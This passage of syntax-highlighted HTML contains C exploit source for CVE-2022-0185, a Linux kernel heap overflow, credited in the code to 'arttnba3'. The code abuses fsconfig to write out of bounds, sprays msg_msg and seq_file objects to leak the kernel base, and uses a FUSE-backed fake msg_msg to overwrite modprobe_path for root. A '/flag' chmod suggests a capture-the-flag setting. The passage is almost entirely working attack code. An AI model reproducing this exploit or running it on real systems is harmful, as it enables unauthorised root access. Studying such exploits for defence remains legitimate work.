class="hljs-string">&quot;/&quot;</span> EVIL_FILE_NAME</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) <br>               + SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; primary_msg;<br><br><span class="hljs-type">char</span> *evil_args[] = &#123; EVIL_DAEMON_NAME, EVIL_MOUNT_PATH, <span class="hljs-literal">NULL</span> &#125;;<br><span class="hljs-type">int</span> exp_fs_fd;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_readdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">void</span>* buf, </span><br><span class="hljs-params">                               <span class="hljs-type">fuse_fill_dir_t</span> filler, <span class="hljs-type">off_t</span> offset, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info* fi, </span><br><span class="hljs-params">                               <span class="hljs-keyword">enum</span> fuse_readdir_flags flags)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_getattr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-keyword">struct</span> stat *stbuf, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_read</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_write</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                             <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fuse_operations</span> <span class="hljs-title">a3fuse_evil_ops</span> =</span> &#123;<br>    .readdir = a3fuse_evil_readdir,<br>    .getattr = a3fuse_evil_getattr,<br>    .read = a3fuse_evil_read,<br>    .write = a3fuse_evil_write,<br>&#125;;<br><br><span class="hljs-type">char</span> cat_flag[] = <span class="hljs-string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;<br><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\n\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> __msgsz = msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>);<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, __msgsz, msgtyp, <br>                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next, <span class="hljs-type">uint64_t</span> m_list_prev, </span><br><span class="hljs-params">              <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts,  <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_readdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">void</span>* buf, </span><br><span class="hljs-params">                               <span class="hljs-type">fuse_fill_dir_t</span> filler, <span class="hljs-type">off_t</span> offset, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info* fi, </span><br><span class="hljs-params">                               <span class="hljs-keyword">enum</span> fuse_readdir_flags flags)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> -ENOENT;<br>    &#125;<br><br>    filler(buf, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    filler(buf, <span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    filler(buf, EVIL_FILE_PATH, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_getattr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-keyword">struct</span> stat *stbuf, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(path, <span class="hljs-string">&quot;/&quot;</span>)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0755</span> | S_IFDIR;<br>        stbuf-&gt;st_nlink = <span class="hljs-number">2</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(path + <span class="hljs-number">1</span>, EVIL_FILE_PATH)) &#123;<br>        stbuf-&gt;st_mode = <span class="hljs-number">0644</span> | S_IFREG;<br>        stbuf-&gt;st_nlink = <span class="hljs-number">1</span>;<br>        stbuf-&gt;st_size = <span class="hljs-number">0x1000</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> -ENOENT;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_read</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-comment">/* I only set one page there */</span><br>    <span class="hljs-type">char</span> evil_buf[<span class="hljs-number">0x1000</span>], fake_msg[<span class="hljs-number">0x100</span>];<br>    <br>    <span class="hljs-keyword">if</span> (offset &gt;= <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (offset + size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        size = <span class="hljs-number">0x1000</span> - offset;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(evil_buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(evil_buf));<br>    <span class="hljs-built_in">strcpy</span>(evil_buf, <span class="hljs-string">&quot;arttnba3/tmp/evil.sh&quot;</span>);<br>    <span class="hljs-built_in">memcpy</span>(buf, evil_buf + offset, size);<br><br>    <span class="hljs-comment">/* fake msg_msg with `next` pointing to modprobe_path*/</span><br>    buildMsg(fake_msg, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>, <br>             *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">0xffffffff82891160</span> + kernel_offset, <br>             *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>);<br>    fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;&quot;</span>, fake_msg + <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_write</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                             <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span><br>&#123;<br>    <span class="hljs-comment">/* I only set one page there */</span><br>    <span class="hljs-type">char</span> evil_buf[<span class="hljs-number">0x1000</span>];<br>    <br>    <span class="hljs-keyword">if</span> (offset &gt;= <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (offset + size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        size = <span class="hljs-number">0x1000</span> - offset;<br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(evil_buf + offset, buf, size);<br>    <br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief make an out-of-bound write to the next object in kmalloc-4k,</span><br><span class="hljs-comment"> * note that the buf before will always be appended to a &quot;,=&quot;,</span><br><span class="hljs-comment"> * for a ctx-legacy_data with 4095 bytes&#x27; data, the &#x27;,&#x27; will be the last byte,</span><br><span class="hljs-comment"> * and the &#x27;=&#x27; will always be on the first by of the object nearby</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * @param buf buf to write to next object</span><br><span class="hljs-comment"> * @return int - the fd for filesystem context</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">oobWritePrepare</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br><br>    <span class="hljs-comment">/* get a filesystem context */</span><br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to fsopen()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment">     * so that the (PAGE_SIZE - 2 - size) overflow</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> fs_fd;    <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">leakKernelBase</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br>    <span class="hljs-type">int</span> msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span> seq_fd[SEQ_FILE_NUM];<br>    <span class="hljs-type">char</span> m_ts_buf[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">uint64_t</span> buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-comment">/* create message queue */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] create message queue for data leaking...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* spray msg_msg in half of message queues and seq_file */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray msg_msg in half of message queues and seq_files...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (MSG_QUEUE_NUM / <span class="hljs-number">2</span>); i++) &#123;<br>        <span class="hljs-built_in">memset</span>(&amp;primary_msg.mtext, <span class="hljs-string">&#x27;A&#x27;</span> + i, <span class="hljs-keyword">sizeof</span>(primary_msg) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>));<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i],&amp;primary_msg, <span class="hljs-keyword">sizeof</span>(primary_msg),MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at sending msg_msg on %d queue\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to send message!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at opening %d seq_file\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to open /proc/self/stat!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* fsconfig() to set the size to the &amp;msg_msg-&gt;m_ts */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fsconfig() to set the size to the &amp;msg_msg-&gt;m_ts...&quot;</span>);<br>    fs_fd = oobWritePrepare();<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, <br>             <span class="hljs-string">&quot;arttnbaarttnbaarttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-comment">/* spray msg_msg into the left half of message queues and seq_files */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray msg_msg in another half of message queues and seq_files..&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (MSG_QUEUE_NUM / <span class="hljs-number">2</span>); i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-built_in">memset</span>(&amp;primary_msg.mtext, <span class="hljs-string">&#x27;A&#x27;</span> + i, <span class="hljs-keyword">sizeof</span>(primary_msg) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>));<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i],&amp;primary_msg, <span class="hljs-keyword">sizeof</span>(primary_msg),MSG_TYPE) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at sending msg_msg on %d queue\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to send message!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at opening %d seq_file\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to open /proc/self/stat!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* oob write to overwrite m_ts of one msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] oob write to overwrite m_ts of one msg_msg...&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(m_ts_buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(m_ts_buf));<br>    *((<span class="hljs-type">long</span>*) m_ts_buf) = <span class="hljs-number">0xfd0</span> + <span class="hljs-number">0xff0</span>;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;\x00&quot;</span>, m_ts_buf, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* spray more seq_operations */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray more seq_operations...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = MSG_QUEUE_NUM; i &lt; SEQ_FILE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error at opening %d seq_file\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to open /proc/self/stat!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* check for oob read */</span><span class="hljs-type">size_t</span> data_leak = <span class="hljs-number">-1</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for oob reading...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-type">ssize_t</span> rcvsz;<br>    <br>        <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>        <span class="hljs-keyword">if</span> ((rcvsz = peekMsg(msqid[i], buf, <span class="hljs-number">0xfd0</span> + <span class="hljs-number">0xff0</span> - <span class="hljs-number">8</span> + <span class="hljs-number">0x10</span>, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] failed to read at %d queue\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;FAILED to msgrcv(MSG_COPY)!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment">/* normal queue, just ignore */</span><br>        <span class="hljs-keyword">if</span> (rcvsz == (<span class="hljs-number">0xfd0</span> + <span class="hljs-number">0x18</span>)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; (<span class="hljs-number">0xfd0</span> + <span class="hljs-number">0xfd0</span>) / <span class="hljs-number">8</span>; j++) &#123;<br>            <span class="hljs-comment">//printf(&quot;[----data dump][%d] %p\n&quot;, j, buf[j]);</span><br>            <span class="hljs-keyword">if</span> (buf[j] &gt; kernel_base &amp;&amp; ((buf[j] &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x4d0</span>)) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] get data leak: %lx\n&quot;</span>, buf[j]);<br>                data_leak = buf[j];<br>                <span class="hljs-keyword">goto</span> out;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>out:<br>    <span class="hljs-keyword">if</span> (data_leak == <span class="hljs-number">-1</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to leak kernel info!&quot;</span>);<br>    &#125;<br><br>    kernel_offset = data_leak - <span class="hljs-number">0xffffffff813834d0</span>;<br>    kernel_base += kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%lx  &quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1moffset: \033[0m%lx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] modprobe_path: %lx\n&quot;</span>, <span class="hljs-number">0xffffffff82891160</span> + kernel_offset);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitraryWriteByMsg</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> msqid, evil_file_fd;<br>    <span class="hljs-type">char</span> *nearby_page, *evil_page;<br>    <span class="hljs-type">int</span> msg_sz;<br><br>    msg_sz = <span class="hljs-number">0xfd0</span> + <span class="hljs-number">0x18</span>;<br><br>    <span class="hljs-keyword">if</span> ((evil_file_fd = open(EVIL_FILE_PATH, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to open evil file in FUSE!&quot;</span>);<br>    &#125;<br><br>    nearby_page = (<span class="hljs-type">char</span>*) mmap((<span class="hljs-type">void</span>*)<span class="hljs-number">0x1337000</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, <br>                               MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    evil_page = (<span class="hljs-type">char</span>*) mmap((<span class="hljs-type">void</span>*)<span class="hljs-number">0x1338000</span>, <span class="hljs-number">0x1000</span>,  PROT_READ | PROT_WRITE, <br>                             MAP_SHARED | MAP_FIXED, evil_file_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (evil_page != (<span class="hljs-type">char</span>*)<span class="hljs-number">0x1338000</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to map for FUSE file!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(nearby_page, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>    &#125;<br>    <br>    exp_fs_fd = oobWritePrepare();<br><br>    writeMsg(msqid, nearby_page - <span class="hljs-number">0xfd0</span> + <span class="hljs-number">8</span>, msg_sz, MSG_TYPE);<br>    <br>    munmap(nearby_page, <span class="hljs-number">0x1000</span>);<br>    munmap(evil_page, <span class="hljs-number">0x1000</span>);<br>    close(evil_file_fd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br>    <span class="hljs-type">int</span> seq_fd[SEQ_FILE_NUM], leak_msqid[MSG_QUEUE_NUM], shell_fd;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x2000</span>];<br>    <span class="hljs-type">uint64_t</span> *data;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] CVE-2022-0185 - exploit by arttnba3&quot;</span>);<br><br>    <span class="hljs-comment">/* create new namespace to get CAP_SYS_ADMIN */</span><br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNS | CLONE_NEWUSER) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to unshare()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* to run the exp on the specific core only */</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-comment">/* register for FUSE */</span><br>    system(<span class="hljs-string">&quot;mkdir -p &quot;</span> EVIL_MOUNT_PATH);<br>    <span class="hljs-keyword">if</span> (fuse_main(<span class="hljs-keyword">sizeof</span>(evil_args) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>*) - <span class="hljs-number">1</span>, evil_args, <br>                  &amp;a3fuse_evil_ops, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to create FUSE!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* leak kernel base */</span><br>    leakKernelBase();<br><br>    <span class="hljs-comment">/* prepare file for triggering modprobe_path */</span><br>    system(<span class="hljs-string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /tmp/fake&quot;</span>);<br><br>    <span class="hljs-comment">/* prepare file for fake modprobe_path */</span><br>    shell_fd = open(<span 